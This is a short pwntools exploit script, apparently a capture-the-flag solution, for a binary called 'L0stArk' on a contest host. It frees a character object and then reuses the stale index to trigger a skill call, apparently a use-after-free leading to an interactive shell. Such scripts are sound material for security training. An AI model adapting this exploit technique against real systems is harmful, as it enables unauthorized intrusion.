#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "lostark.sstf.site"
PORT = 1337
PROCESS = "./L0stArk"

def create(type, name):
	r.sendline("1")
	r.sendlineafter(": ", str(type))

	if type != 7:
		r.sendlineafter(": ", name)

	r.recvuntil("pick: ")

def choose(idx):
	r.sendline("4")
	r.sendlineafter(": ", str(idx))
	r.recvuntil("pick: ")

def delete(idx):
	r.sendline("2")
	r.sendlineafter(": ", str(idx))
	r.recvuntil("pick: ")

def useskill():
	r.sendline("6")

def exploit(r):
	create(7, "")
	delete(0)
	create(1, "AAAA")
	choose(0)
	useskill()
	
	r.interactive()
	
	return

if __name__ == "__main__":
	if len(sys.argv) > 1:
		LOCAL = False
		r = remote(HOST, PORT)		
	else:
		LOCAL = True
		r = process("./L0stArk")
		print (util.proc.pidof(r))
		pause()
	
	exploit(r)